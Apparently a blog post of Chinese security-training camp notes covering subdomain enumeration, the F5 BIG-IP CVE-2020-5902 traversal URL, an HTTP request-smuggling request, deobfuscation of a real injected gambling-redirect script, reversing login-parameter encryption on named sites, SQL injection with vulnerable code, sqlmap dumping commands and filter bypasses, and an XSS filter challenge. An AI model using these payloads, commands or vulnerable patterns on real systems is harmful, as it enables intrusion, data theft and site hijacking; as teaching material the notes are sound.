# 2021年暑期夏令营笔记(day1-day3)



<div class="has-toc have-toc">
</div>

## 0x00 day1

### Web 基础课程

**泛解析**

123.example.com

2389qjlsfa.example.com

所谓“泛域名解析”是指：利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。

**挖掘子域**

爆破子域 admin mail ftp

使用收集dns数据的在线网站查找 <a href="https://rapiddns.io/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://rapiddns.io/</a>

抓取网站的链接分析

域名备案搜集资产 <a href="https://beian.miit.gov.cn/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://beian.miit.gov.cn/</a>

搜索引擎语法搜索

whois关联查询

查询证书<a href="https://crt.sh/" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://crt.sh/</a>

**工具**

sublist3r--<a rel="noreferrer noopener" href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="nofollow" >https://github.com/aboul3la/Sublist3r</a>

ksubdomain--<a rel="noreferrer noopener" href="https://github.com/knownsec/ksubdomain" target="_blank" rel="nofollow" >https://github.com/knownsec/ksubdomain</a>

oneforall--<a rel="noreferrer noopener" href="https://github.com/shmilylty/OneForAll" target="_blank" rel="nofollow" >https://github.com/shmilylty/OneForAll</a>

**反向代理与服务器的差异导致的问题**

**f5-big-ip-CVE-2020-5902**

f5-big-ip 是一个本地流量管理器，常用于确保应用流量的安全，并对应用流量进行优化和负载均衡

https://ip/tmui/login.jsp

https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp

Apache会把 `/..;/` 当作一个正常目录去对待，而Tomcat会把它当作父目录，当Apache将请求转发到Tomcat时，Tomcat会把它看作是:

https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp

https://xxxx/tmui/tmui/locallb/workspace/fileRead.jsp

**http请求走私**

请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 `Content-Length` 和 `Transfer-Encoding` 标头

前端服务器处理 `Content-Length` 这一请求头，而后端服务器遵守RFC2616的规定，忽略掉 `Content-Length` ，处理 `Transfer-Encoding` 。例如

<pre class="wp-block-code"><code>POST / HTTP/1.1
Host: example.com
...
Connection: keep-alive
Content-Length: 6
Transfer-Encoding: chunked

0

a</code></pre>

### JavaScript 基础

#### JS笔记

HTML嵌入JavaScript的方式：1、事件句柄；2、脚本块；3、引入外部独立的JS文件。

在JS当中，函数的名字不能重复，当函数重名的时候，后声明的函数会将之前的覆盖。

当一个变量声明的时候没有使用var关键字，那么不管这个变量是在哪里声明的，都是全局变量。

**常用事件**

<pre class="wp-block-code"><code>blur 失去焦点
focus 获得焦点
click 鼠标单击
dblclick 鼠标双击
keydown 键盘按下
keyup 键盘弹起
mousedown 鼠标按下
mouseover 鼠标经过
mousemove 鼠标移动
mouseout 鼠标离开
mouseup 鼠标弹起
reset 表单重置
submit 表单提交
change 下拉列表选中项改变，或文本框内容改变
select 文本被选定
load 页面加载完毕</code></pre>

_任何一个事件都会对应一个事件句柄，事件句柄是在事件前添加on，例如：onclick_

JavaScript的三大块

  * ECMAScript：JS的核心语法（ES规范/ECMA-262标准）
  * DOM：Document Object Model（文档对象模型）
      * 对网页当中的节点进行增删改查的过程
      * HTML文档被当作一棵DOM树来看待例如：`var domObj = document.getElementById('id');`
  * BOM：Browser Object Moder（浏览器对象模型）
      * 关闭浏览器窗口、打开新的浏览器窗口、后退、前进、浏览器地址栏上的地址等

DOM和BOM的区别与联系

  * BOM的顶级对象是：window
  * DOM的顶级对象是：document
  * 实际上BOM包括DOM

innerHTML和innerText的区别

  * 相同点：都是设置元素内部的内容
  * 不同点：
      * innerHTML会把后面的字符串当作一段HTML代码解释并执行
      * innerText只会将后面的字符串作为普通字符串来看待

正则表达式对象的创建与调用

  * 创建方式一`var regExp = /正则表达式/flags;`
  * 创建方式二（使用内置支持类RegExp）`var regExp = new RegExp ("正则表达式","flags");`<figure class="wp-block-table">

| flags | 含义       |
| ----- | -------- |
| g     | 全局匹配     |
| i     | 区分大小写的匹配 |
| m     | 多行匹配     |</figure> 

_ES规范制定之后才支持m，当前面是正则表达式时，m不能用，只有前面是普通字符串时才可以使用_。

#### JS解密实例

网站篡改被植入博彩跳转js，view-source:http://www.baoyuhuang.com/

```html
<title>beplayer体育app下载-【welcome】</title>
<meta name="keywords" content="beplayer体育app下载-beplayer体育官方版APP下载-beplay下载官网_Beplay体育软件_beplay体育app安卓"/>
<meta name="description" content="【Beplayapp体育下载WWW.bob0897.COM】为您专业提供欧冠、体育、足球等资讯, beplayer体育下载包括:欧冠、奥运、世界杯、亚洲杯、欧洲杯等最精彩的体育赛事和beplayer体育官网投资..."/>
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="鲍鱼的营养价值,鲍鱼批发市场,干鲍鱼价格,即食鲍鱼罐头,鲍鱼的家常做法大全-滋补皇鲍鱼网"}</script>
<script type="text/javascript">eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\'\'.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\'\\\\w+\'};c=1};l(c--)i(k[c])p=p.j(s t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);h p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a.b/c.d"></0>\\\');\',m,m,\'u|v|x|y|z|A|B|C|D|E|F|G|H|I\'.J(\'|\'),0,{}))',46,46,'|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split'.split('|'),0,{}))</script>
<meta name="description" content="滋补皇鲍鱼网是业内权威的的鲍鱼网站，提供鲍鱼的营养价值和功效作用、鲍鱼的批发市场、鲍鱼价格多少钱一斤、鲍鱼选购鉴别、鲍鱼的家常做法吃法、品牌即食鲍鱼罐头购买、鲍鱼图片等相关鲍鱼百科知识。" />
<meta name="keywords" content="鲍鱼,鲍鱼的做法,鲍鱼价格,鲍鱼批发,鲍鱼批发市场,即食鲍鱼,鲍鱼多少钱一斤,鲍鱼的营养价值,鲍鱼怎么做,鲍鱼网" />
```

解密第一步

```javascript
    eval(function (p, a, c, k, e, r) {
        e = function (c) {
            return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
        };
        if (!''.replace(/^/, String)) {
            while (c--) r[e(c)] = k[c] || e(c);
            k = [function (e) {
                return r[e]
            }];
            e = function () {
                return '\\w+'
            };
            c = 1
        }
        ;
        while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
        console.log(p)
    }('n(f(p,a,c,k,e,r){e=f(c){h c.o(a)};i(!\'\'.j(/^/,q)){l(c--)r[e(c)]=k[c]||e(c);k=[f(e){h r[e]}];e=f(){h\'\\\\w+\'};c=1};l(c--)i(k[c])p=p.j(s t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);h p}(\'1["2"]["3"](\\\'<0 4="5/6" 7="8://9.a.b/c.d"></0>\\\');\',m,m,\'u|v|x|y|z|A|B|C|D|E|F|G|H|I\'.J(\'|\'),0,{}))', 46, 46, '|||||||||||||||function||return|if|replace||while|14|eval|toString||String||new|RegExp|script|window||document|write|type|text|javascript|src|https|www|bob5918|com|bob|js|split'.split('|'), 0, {}))
```

解密第二步

```javascript
    eval(function (p, a, c, k, e, r) {
        e = function (c) {
            return c.toString(a)
        };
        if (!''.replace(/^/, String)) {
            while (c--) r[e(c)] = k[c] || e(c);
            k = [function (e) {
                return r[e]
            }];
            e = function () {
                return '\\w+'
            };
            c = 1
        }
        ;
        while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]);
        console.log(p)
    }('1["2"]["3"](\'<0 4="5/6" 7="8://9.a.b/c.d"></0>\');', 14, 14, 'script|window|document|write|type|text|javascript|src|https|www|bob5918|com|bob|js'.split('|'), 0, {}))
```

解密内容

```
window["document"]["write"]('<script type="text/javascript" src="https://www.bob5918.com/bob.js"></script>');
```

<a rel="noreferrer noopener" href="https://www.bob5918.com/bob.js" data-type="URL" data-id="https://www.bob5918.com/bob.js" target="_blank" rel="nofollow" >查看劫持代码</a>

```javascript
var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?18963394de828e9ee31d0bfb3e310da3";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
    (function () {
        /*百度推送代码*/
        var bp = document.createElement('script');
        bp.src = '//push.zhanzhang.baidu.com/push.js';
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
        /*360推送代码*/
        var src = document.location.protocol + '//js.passport.qihucdn.com/11.0.1.js?8113138f123429f4e46184e7146e43d9';
        document.write('<script src="' + src + '" id="sozz"><\/script>');
    })();

    document.writeln("<script LANGUAGE=\"Javascript\">");
    document.writeln("var s=document.referrer");
    document.writeln("if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 )");
    document.writeln("location.href=\"https://www.136415.com\";");
    document.writeln("</script>");
```

js加密实现<a href="https://tool.chinaz.com/js.aspx" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://tool.chinaz.com/js.aspx</a>

#### JS逆向实例

**澎湃新闻搜索参数加密逆向**

澎湃新闻搜索参数

  * <a rel="noreferrer noopener" href="https://www.thepaper.cn/searchResult.jsp" target="_blank" rel="nofollow" >https://www.thepaper.cn/searchResult.jsp</a>
  * 搜索关键字"sckval"
  * 通过POST请求<a rel="noreferrer noopener" href="https://www.thepaper.cn/getCheckCodeData.jsp" target="_blank" rel="nofollow" >https://www.thepaper.cn/getCheckCodeData.jsp</a>获取suuid、codeData
  * 调用CryptoJS.AES实现加密

<pre class="wp-block-code"><code>  // npm install crypto-js
  const CryptoJS = require("crypto-js");
  // CryptoJS
  // console.log(CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex))
  function jiami(suuid,codeData){
      kdStr = {}
      kdStr.suuid = suuid
      kdStr.codeData= codeData
      var iv = CryptoJS.lib.WordArray.random(128 / 8).toString(CryptoJS.enc.Hex);
      var kd = CryptoJS.enc.Utf8.parse(kdStr.codeData);
      md = CryptoJS.mode.ECB;
      var edt = CryptoJS.AES.encrypt(kdStr.codeData, kd, {
          iv: CryptoJS.enc.Hex.parse(iv),
          mode: md,
          padding: CryptoJS.pad.Pkcs7
      });
      var returnObj = {};
      returnObj.codeData = kdStr.codeData;
      returnObj.seeda = encodeURIComponent(edt);
      returnObj.suuid = kdStr.suuid;
      var checkValue = CryptoJS.MD5(kdStr.codeData + kdStr.suuid).toString();
      returnObj.sckval = checkValue;
      return &#91;returnObj.sckval,returnObj.seeda]
  }

  console.log(jiami("519ef32d-8725-4fcc-9b84-7ba1c28e1e29","XX2jgLQxVbxn4M2l"))</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="851" height="333" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-134.png" alt="" class="wp-image-2741" /> </figure> 

**登录参数加密逆向**

某平台登录参数

  * <a href="http://eip.chanfine.com/login.jsp" target="_blank" rel="noreferrer noopener" rel="nofollow" >http://eip.chanfine.com/login.jsp</a>
  * 搜索关键字"j_password"
  * 获取JSESSIONID=FA0F80009AAA8F32D36C2FBBF2DDBD62
  * 调用CryptoJS.AES.encrypt实现加密

<pre class="wp-block-code"><code>const CryptoJS = require("crypto-js");
function sec_get(encodeType) {
    var str = "E3C10065F9DD13243BF72AE1E02AC002"
    if (encodeType == null || encodeType == 'aes') {
        if (str.length &lt; 32) {
            str += "abcdefghijklmnopqrstuvwxyz1234567890"
        }
        str = str.toUpperCase();
        var key = {};
        key.key = str.substring(0, 16);
        key.iv = str.substring(16, 32);
        key.security = "\u4435\u5320\u4d35"
    }
    return key
}

function calljs(){
    keyObj = sec_get();
    value = "6666666"
    value = CryptoJS.AES.encrypt(value, CryptoJS.enc.Utf8.parse(keyObj.key), {
        iv: CryptoJS.enc.Utf8.parse(keyObj.iv)
    }).toString()
    return  keyObj.security + value
}

console.log(calljs())</code></pre><figure class="wp-block-image size-full">

<img loading="lazy" width="826" height="356" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-135.png" alt="" class="wp-image-2746" /> </figure> 

## 0x01 day2

关系型运算符优先级高到低为：NOT＞AND＞OR

select * from user where a=1 and b=2 or c=3 and d=4 •where子句中执行的先后顺序是：

  * 最先是 a=1 and b=2
  * 然后是 c=3 and d=4
  * 最后是两个结果集or 等于 (a=1 and b=2) or (c=3 and d=4 )

**SQL注入本质**：SQL使用拼接方法，可注入恶意SQL语句改变原本语句执行逻辑<figure class="wp-block-image size-full">

<img loading="lazy" width="1218" height="663" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-140.png" alt="" class="wp-image-2758" /> </figure> 

漏洞代码示例

JDBC

```
Connection conn = [...];
Statement stmt = con.createStatement();
ResultSet rs = stmt.executeQuery("select * from user where username='"<span class="has-inline-color has-vivid-red-color">+username+</span>"';");
```

Hibernate

```
Session session = sessionFactory.openSession();
Query q = session.createQuery("select t from UserEntity t where id = "<span class="has-inline-color has-vivid-red-color">+input</span>);
q.execute();
```

Mybatis

```
<select id="unsafe" resultMap="myResultMap">
         select * from table where name like '%<span class="has-inline-color has-vivid-red-color">${value}</span>%'
</select> 
UnSafeBean b = (UnSafeBean)sqlMap.queryForObject("value", request.getParameter("name"));
```

ibatis

```
<select id="unsafe" resultMap="myResultMap">
         select * from table where name ='$<span class="has-inline-color has-vivid-red-color">value</span>$'
</select> 
```


识别Web应用与数据库交互的可能输入:POST请求参数 、GET请求参数、Cookie、Host、X-Forwarded-for……

oracle中判断数字型和字符型可以用`/`来进行除的操作。<figure class="wp-block-image size-full">

<img loading="lazy" width="969" height="313" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-141.png" alt="" class="wp-image-2760" /> </figure> 

数字型注入四则运算（尽量不使用“+”进行测试，+号在绝大多数网站中会被识别为空格）。

数字型注入1/0操作，MySQL 1/0报Warning，语句仍会正常执行；Oracle 1/0报Error，语句抛出异常。

**判断数据库类型**

**基于报错信息** 

Oracle `Error querying database.  Cause: java.sql.SQLSyntaxErrorException: <span class="has-inline-color has-vivid-red-color">ORA</span>-01756: quoted string not properly terminated`

SQL Server `Microsoft OLE DB Provider for<span class="has-inline-color has-vivid-red-color"> SQL Server</span> 错误 '80040e14'`

MySQL `You have an error in your SQL syntax; check the manual that corresponds to your <span class="has-inline-color has-vivid-red-color">MySQL</span> server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`<figure class="wp-block-image size-full">

<img loading="lazy" width="946" height="469" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-147.png" alt="" class="wp-image-2781" /></figure> 

注入优先级：联合注入＞报错注入＞布尔盲注 ＞时间盲注

不同MySQL版本函数报错输出情况:

  * MySQL 5.0.96 floor可回显想要的查询信息
  * MySQL 5.5.29 部分函数报错可回显想要的查询信息
  * MySQL 5.7.26 floor、extractvalue、 updatexml可回显想要的查询信息
  * MySQL 8 extractvalue、 updatexml可回显想要的查询信息

堆叠注入，顾名思义，就是将语句堆叠在一起进行查询 p可以同时执行多条语句的执行时的注入。在SQL中，分号（;）是用来表示一条sql语句的结束。与union injection（联合注入）的区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆查询注入可以执行的是任意的语句。

**SQLmap常用命令**

<pre class="wp-block-code"><code>python sqlmap.py -u url --users    #列出所有用户
python sqlmap.py -u url --current-user    #列出当前用户
python sqlmap.py -u url --is-dba    #查看当前用户是否为数据库管理员
python sqlmap.py -u url --dbs  #列出所有数据库
python sqlmap.py -u url --current-db    #查看当前数据库
python sqlmap.py -u url -D "数据库名称" --tables  #查表名
python sqlmap.py -u url -D "数据库名" -T "表名" --colunms   #查列名
python sqlmap.py -u url -D "数据库名" -T "表名" -C "列名" --dump  #查询记录
python sqlmap.py -u url -D "数据库名" -T "表名" -C "列名" --dump --start n --stop m #查询记录n-m区间内的记录
python sqlmap.py -u url --data "POST数据" #POST请求注入
python sqlmap.py -r r.txt #将整个请求数据包保存为r.txt进行注入</code></pre>

**字符过滤**

可过滤一些关键字<figure class="wp-block-image size-full">

<img loading="lazy" width="1023" height="73" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-148.png" alt="" class="wp-image-2796" /> </figure> 

可过滤一些特殊符号<figure class="wp-block-image size-full">

<img loading="lazy" width="310" height="67" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-149.png" alt="" class="wp-image-2797" /> </figure> 

**字符绕过**

使用这些字符进行注入点识别：+，-，*，%，/，>，||，|，&，&&

可以将and换成or，&&， ||等，也可以不使用and或者or，直接使用异或截断： •1^1^0，1^0^0<figure class="wp-block-image size-full">

<img loading="lazy" width="584" height="270" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-151.png" alt="" class="wp-image-2801" /></figure> 

**SQL ByPass**<figure class="wp-block-image size-full">

<img loading="lazy" width="1082" height="569" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-153.png" alt="" class="wp-image-2803" /> </figure> 

**预编译修复**

JDBC

```
Connection conn = [...];
conn.<span class="has-inline-color has-vivid-red-color">prepareStatement</span>("update COFFEES set SALES = ? where COF_NAME = ?");
updateSales.setInt(1, nbSales);
updateSales.setString(2, coffeeName);
```

Mybatis

```
<select id="unsafe" resultMap="myResultMap">
         select * from table where name like ‘%<span class="has-inline-color has-vivid-red-color">#{value}</span>%'
</select> 
UnSafeBean b = (UnSafeBean)sqlMap.queryForObject("value",   request.getParameter("name"));
```


ibatis

```
<select id="unsafe" resultMap="myResultMap">
         select * from table where name =‘<span class="has-inline-color has-vivid-red-color">#value#</span>'
</select> 
```


## 0x02 day3

XSS 安全基础

<figure class="wp-block-image size-full">

<img loading="lazy" width="766" height="488" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-167.png" alt="" class="wp-image-2872" /> </figure> 

**XSS在哪？**

  * 直接插入到SCRIPT标签里
  * 插入到HTML注释里
  * 插入到HTML标签的属性名里
  * 插入到HTML标签的属性值里
  * 作为HTML标签的名字
  * 直接插入到CSS里，范例：`test" style="css:expressio/**/n(alert(1))" a="`

**常见业务场景**

重灾区--评论区、留言区、个人信息、订单信息、…… 

针对型--站内信、私信、意见反馈、…… 

存在风险--搜索框、当前目录、图片属性、……

**如何判断是否存在XSS?**

反射型 

  * 数据包中各种参数输入特定字符串进行尝试，查看返回包是否存在特定字符串 
  * 确定参数可回显后，判断是否可渲染 
      * 数据包返回类型 html：页面搜索传输的特定字符串 
      * 数据包返回类型 json：查看前端渲染情况
  * 字符fuzz，看是否过滤或转义XSS常用的字符

存储型

  * 字符fuzz，看是否过滤或转义XSS常用的字符

xss安全基础题目

```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 //window.location.href="level10.php?keyword=well done!"; 
}
</script>
<title>欢迎来到level21</title>
</head>
<body>
<h1 align=center>欢迎来到level21</h1>
<?php 
function remove_xss($val) {
   // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed
   // this prevents some character re-spacing such as <java\0script>
   // note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs
//http://blog.qita.in
   $val = preg_replace('/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/', '', $val);

   // straight replacements, the user should never need these since they're normal characters
   // this prevents like <IMG SRC=@avascript:alert('XSS')>
   $search = 'abcdefghijklmnopqrstuvwxyz';
   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
   $search .= '1234567890!@#$%^&*()';
   $search .= '~`";:?+/={}[]-_|\'\\';
   for ($i = 0; $i < strlen($search); $i++) {
      // ;? matches the ;, which is optional
      // 0{0,7} matches any padded zeros, which are optional and go up to 8 chars

      // @ @ search for the hex values
      $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); // with a ;
      // @ @ 0{0,7} matches '0' zero to seven times
      $val = preg_replace('/(�{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ;
   }

   // now the only remaining whitespace attacks are \t, \n, and \r
   $ra1 = array('javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base');
   $ra2 = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload');
   $ra = array_merge($ra1, $ra2);

   $found = true; // keep replacing as long as the previous round replaced something
   while ($found == true) {
      $val_before = $val;
      for ($i = 0; $i < sizeof($ra); $i++) {
         $pattern = '/';
         for ($j = 0; $j < strlen($ra[$i]); $j++) {
            if ($j > 0) {
               $pattern .= '(';
               $pattern .= '(&#[xX]0{0,8}([9ab]);)';
               $pattern .= '|';
               $pattern .= '|(�{0,8}([9|10|13]);)';
               $pattern .= ')*';
            }
            $pattern .= $ra[$i][$j];
         }
         $pattern .= '/i';
         $replacement = substr($ra[$i], 0, 2).'<x>'.substr($ra[$i], 2); // add in <> to nerf the tag
         $val = preg_replace($pattern, $replacement, $val); // filter out the hex tags
         if ($val_before == $val) {
            // no replacements were made, so exit the loop
            $found = false;
         }
      }
   }
   return $val;
}
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);
$str2=remove_xss($str);
echo "<h2 align=center>欢迎用户".$str2."</h2>";
?>

<?php 
echo "<h3 align=center>payload的长度:".strlen($str2)."</h3>";
?>
</body>
</html>
```

查找下没有被过滤的事件<a href="https://www.runoob.com/jsref/dom-obj-event.html" target="_blank" rel="noreferrer noopener" rel="nofollow" >https://www.runoob.com/jsref/dom-obj-event.html</a><figure class="wp-block-image size-full">

<img loading="lazy" width="1032" height="489" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-175.png" alt="" class="wp-image-2918" /></figure>
